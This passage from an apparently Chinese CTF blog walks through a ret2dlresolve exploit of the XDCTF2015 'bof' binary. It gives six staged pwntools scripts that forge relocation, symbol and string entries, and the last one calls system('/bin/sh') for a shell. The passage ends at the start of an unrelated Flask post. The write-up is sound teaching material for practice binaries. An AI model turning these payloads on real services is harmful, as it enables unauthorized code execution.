class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">0x18</span>)</span><br><span class="line">payload+=p32(<span class="number">7</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这一步是简单地进行栈转移然后调用write函数输出打印<code>/bin/sh\x00</code>内容</p><h3 id="stage2"><a class="markdownIt-Anchor" href="#stage2"></a> stage2</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">108</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">stack_size=<span class="number">0x800</span></span><br><span class="line">bss_addr+=stack_size</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets we want to use</span></span><br><span class="line">leave_ret=<span class="number">0x08049116</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># stack-pivot</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(<span class="number">100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=p32(bss_addr+<span class="number">0x800</span>)</span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">payload+=p32(plt0)</span><br><span class="line"><span class="comment"># calculate write index in .rel.plt</span></span><br><span class="line">write_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_index=<span class="built_in">int</span>((<span class="built_in">int</span>(write_addr-plt0)/<span class="number">16</span>-<span class="number">1</span>)*<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(write_index)</span><br><span class="line">payload+=p32(write_index)</span><br><span class="line">payload+=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(bss_addr+<span class="number">28</span>)</span><br><span class="line">payload+=p32(<span class="number">7</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这一步相比于上一步，我们直接手动push参数然后进行<code>__dl_resolve</code>函数的调用</p><h3 id="stage3"><a class="markdownIt-Anchor" href="#stage3"></a> stage3</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">108</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">stack_size=<span class="number">0x800</span></span><br><span class="line">bss_addr+=stack_size</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets we want to use</span></span><br><span class="line">leave_ret=<span class="number">0x08049116</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># stack-pivot</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(<span class="number">100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write /bin/sh</span></span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># make fake reloc</span></span><br><span class="line"><span class="comment">## here we make bss_addr+24 to fake_reloc</span></span><br><span class="line">write_reloc_offset = bss_addr+<span class="number">28</span>-rel_plt</span><br><span class="line"><span class="comment">## get write_got in .got section</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info=<span class="number">0x707</span></span><br><span class="line"></span><br><span class="line">pay=p32(bss_addr+<span class="number">0x100</span>)</span><br><span class="line">pay+=p32(plt0)</span><br><span class="line">pay+=p32(write_reloc_offset)</span><br><span class="line">pay+=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pay+=p32(<span class="number">1</span>)</span><br><span class="line">pay+=p32(bss_addr+<span class="number">80</span>)</span><br><span class="line">sh=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pay+=p32(<span class="built_in">len</span>(sh))</span><br><span class="line">pay+=p32(write_got)</span><br><span class="line">pay+=p32(r_info)</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(pay))</span><br><span class="line">pay+=sh</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这一步在栈上构造的我们自己的<code>.rel.plt</code>内容</p><h3 id="stage4"><a class="markdownIt-Anchor" href="#stage4"></a> stage4</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">108</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">stack_size=<span class="number">0x800</span></span><br><span class="line">bss_addr+=stack_size</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets we want to use</span></span><br><span class="line">leave_ret=<span class="number">0x08049116</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># stack-pivot</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(<span class="number">100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write /bin/sh</span></span><br><span class="line"></span><br><span class="line">sh=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">got0=elf.get_section_by_name(<span class="string">&#x27;.got&#x27;</span>).header.sh_addr</span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">r_inf0=<span class="number">0x707</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make a fake dynsym</span></span><br><span class="line">fake_sym_addr = bss_addr+<span class="number">0x30</span></span><br><span class="line">align=<span class="number">0x10</span>-(fake_sym_addr-dynsym)&amp;<span class="number">0xf</span></span><br><span class="line">fake_sym_addr+=align</span><br><span class="line">index_dynsym=(fake_sym_addr-dynsym)//<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(index_dynsym))</span><br><span class="line"></span><br><span class="line">fake_write_sym=flat([<span class="number">0x42</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x12</span>])</span><br><span class="line">index_offset=bss_addr+<span class="number">28</span>-rel_plt</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info=(index_dynsym&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_write_reloc=flat([write_got,r_info])</span><br><span class="line"></span><br><span class="line">pay=p32(bss_addr+<span class="number">0x100</span>)</span><br><span class="line">pay+=p32(plt0)</span><br><span class="line">pay+=p32(index_offset)</span><br><span class="line">pay+=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pay+=p32(<span class="number">1</span>)</span><br><span class="line">pay+=p32(bss_addr+<span class="number">80</span>)</span><br><span class="line">pay+=p32(<span class="built_in">len</span>(sh))</span><br><span class="line">pay+=fake_write_reloc</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(pay))</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*align</span><br><span class="line">pay+=fake_write_sym</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(pay))</span><br><span class="line">pay+=sh</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这一步我们在栈上又新增构造了.dynsym段，这里比较困难的可能是对偏移计算的理解</p><p>我们在构造的<code>fake_sym_addr</code>后面新加的<code>align</code>构造公式是<code>align=0x10-(fake_sym_addr-dynsym)&amp;0xf</code>,这里的0x10是<code>Elf32_Sym</code>结构体的大小</p><p>对于.rel.plt中<code>r_info</code>字段导向我们构造地址的计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index_offset=(fake_sym_addr-dynsym)//0x10</span><br><span class="line">r_info=(index_dynsym)&lt;&lt;8|0x7</span><br></pre></td></tr></table></figure><h3 id="stage5"><a class="markdownIt-Anchor" href="#stage5"></a> stage5</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">108</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">stack_size=<span class="number">0x800</span></span><br><span class="line">bss_addr+=stack_size</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets we want to use</span></span><br><span class="line">leave_ret=<span class="number">0x08049116</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># stack-pivot</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(<span class="number">100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write /bin/sh</span></span><br><span class="line"></span><br><span class="line">write_str=<span class="string">b&#x27;write\x00&#x27;</span></span><br><span class="line">sh=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">got0=elf.get_section_by_name(<span class="string">&#x27;.got&#x27;</span>).header.sh_addr</span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">r_inf0=<span class="number">0x707</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make a fake dynsym</span></span><br><span class="line">fake_sym_addr = bss_addr+<span class="number">0x30</span></span><br><span class="line">align=<span class="number">0x10</span>-(fake_sym_addr-dynsym)&amp;<span class="number">0xf</span></span><br><span class="line">fake_sym_addr+=align</span><br><span class="line">index_dynsym=(fake_sym_addr-dynsym)//<span class="number">0x10</span></span><br><span class="line"><span class="comment">## str_name+.dynstr == fake_sym_addr+0x10</span></span><br><span class="line">str_name=fake_sym_addr+<span class="number">0x10</span>-dynstr</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(index_dynsym))</span><br><span class="line"></span><br><span class="line">fake_write_sym=flat([str_name,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x12</span>])</span><br><span class="line">index_offset=bss_addr+<span class="number">28</span>-rel_plt</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info=(index_dynsym&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_write_reloc=flat([write_got,r_info])</span><br><span class="line"></span><br><span class="line">pay=p32(bss_addr+<span class="number">0x100</span>)</span><br><span class="line">pay+=p32(plt0)</span><br><span class="line">pay+=p32(index_offset)</span><br><span class="line">pay+=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pay+=p32(<span class="number">1</span>)</span><br><span class="line">pay+=p32(bss_addr+<span class="number">80</span>)</span><br><span class="line">pay+=p32(<span class="built_in">len</span>(sh))</span><br><span class="line">pay+=fake_write_reloc</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(pay))</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*align</span><br><span class="line">pay+=fake_write_sym</span><br><span class="line">pay+=write_str</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(pay))</span><br><span class="line">pay+=sh</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这一步我们更近一步，直接自己构造<code>write\x00</code>在栈空间上，值得注意的是这里的字符解析必须是\x00收尾</p><h3 id="stage6"><a class="markdownIt-Anchor" href="#stage6"></a> stage6</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">108</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">stack_size=<span class="number">0x800</span></span><br><span class="line">bss_addr+=stack_size</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets we want to use</span></span><br><span class="line">leave_ret=<span class="number">0x08049116</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># stack-pivot</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line">payload+=p32(<span class="number">100</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write /bin/sh</span></span><br><span class="line"></span><br><span class="line">write_str=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">sh=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">got0=elf.get_section_by_name(<span class="string">&#x27;.got&#x27;</span>).header.sh_addr</span><br><span class="line">plt0=elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">r_inf0=<span class="number">0x707</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make a fake dynsym</span></span><br><span class="line">fake_sym_addr = bss_addr+<span class="number">0x30</span></span><br><span class="line">align=<span class="number">0x10</span>-(fake_sym_addr-dynsym)&amp;<span class="number">0xf</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;align:&quot;</span>,align)</span><br><span class="line">fake_sym_addr+=align</span><br><span class="line">index_dynsym=(fake_sym_addr-dynsym)//<span class="number">0x10</span></span><br><span class="line"><span class="comment">## str_name+.dynstr == fake_sym_addr+0x10</span></span><br><span class="line">str_name=fake_sym_addr+<span class="number">0x10</span>-dynstr</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(index_dynsym))</span><br><span class="line"></span><br><span class="line">fake_write_sym=flat([str_name,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x12</span>])</span><br><span class="line">index_offset=bss_addr+<span class="number">28</span>-rel_plt</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info=(index_dynsym&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_write_reloc=flat([write_got,r_info])</span><br><span class="line"></span><br><span class="line">pay=p32(bss_addr+<span class="number">0x100</span>)</span><br><span class="line">pay+=p32(plt0)</span><br><span class="line">pay+=p32(index_offset)</span><br><span class="line">pay+=p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pay+=p32(bss_addr+<span class="number">80</span>)</span><br><span class="line">pay+=p32(bss_addr+<span class="number">80</span>)</span><br><span class="line">pay+=p32(<span class="built_in">len</span>(sh))</span><br><span class="line">pay+=fake_write_reloc</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(pay))</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*align</span><br><span class="line">pay+=fake_write_sym</span><br><span class="line">pay+=write_str</span><br><span class="line">pay+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(pay))</span><br><span class="line">pay+=sh</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这一步我们就可以吧write字符直接替换为system，这样在进行函数解析的时候我们实际上调用的就是system函数了，然后再替换push的第一个参数为<code>/bin/sh\x00</code>，可以达成geetshell的目的</p><p>目前对于这个漏洞止步于应用阶段，64位大同小异，具体可以参考ctf-wiki上面的内容；后续如果有机会遇到类似的混合应用我应该会记录一下</p><h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2><ul><li><a href="https://www.52pojie.cn/thread-1700466-1-1.html"> [调试逆向] ret2_dl_runtime_resolve高级栈溢出利用思路 </a></li><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#partial-relro">ctf-wiki ret2dlresolve</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> notes </tag>
            
            <tag> stack-pivoting </tag>
            
            <tag> ret2dlresolve </tag>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-libs z3&amp;flask</title>
      <link href="/2023/02/17/python-libs-z3-flask/"/>
      <url>/2023/02/17/python-libs-z3-flask/</url>
      
        <content type="html"><![CDATA[<p>以下的安装过程全部省略,因为本身不存在什么兼容性问题,用python对应版本的pip进行指令安装就可以在脚本页面进行脚本编写.</p><h1 id="python-flask"><a class="markdownIt-Anchor" href="#python-flask"></a> Python-Flask</h1><p>这个库以前就看到过,写简单的exp交互式脚本挺简单的,关键是他还是轻量级别的服务器;根据官网上的介绍,此库依赖于<code>Jinja</code>引擎和<code>Werkzeug</code> WSGI工具包;有兴趣的可以深入研究一下;工具本身是很简单的一个轻量级框架,只要一点前端基础,也是可以实现一些复杂的程式</p><h2 id="projecttask-manager"><a class="markdownIt-Anchor" href="#projecttask-manager"></a> Project:Task Manager</h2><p>因为没怎么特别高级的需求,所以随便在Youtube上面找了一个1h的快速入门看了一下,质量也挺高的,下面我就直接上项目具体内容</p><p>入门视频:<a href="https://youtu.be/Z1RJmh_OqeA">Learn Flask for Python - Full Tutorial</a></p><p>项目结构:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td 